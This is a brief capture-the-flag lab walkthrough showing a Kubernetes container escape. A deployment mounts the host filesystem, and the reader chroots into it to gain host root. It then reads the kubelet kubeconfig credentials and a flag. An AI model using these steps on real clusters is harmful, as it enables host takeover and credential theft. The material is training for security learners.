# K8S Security: Container Escape to Host

1. Lets apply our deployment.

```
kubectl apply -f deployment_host_fs.yaml
```
_Enter the container._

[The most pointess Kubernetes command ever](https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/).


2. Get pods.
```
kubectl get pods
```

3. Enter a pod.
```
kubectl exec -it [pod_name] -- bash
```
4. List the file system.
```
ls
```
5. Lets cd into the /k8-host directory.
```
cd /k8-host
```
6. Then lets run `chroot` to change the root directory and get host privileges.
```
chroot . bash
```
7. We can now pull the certificates for the cluster.

```
cat /var/lib/kubelet/kubeconfig
```
```
ls
```
```
cat flag
```
8. [Submit the flag.](https://devslop.ctfd.io/challenges#Challenge%2019-12)

9. Exit
```
exit
```
10. Cleanup
```
kubectl delete -f deployment_host_fs.yaml
```
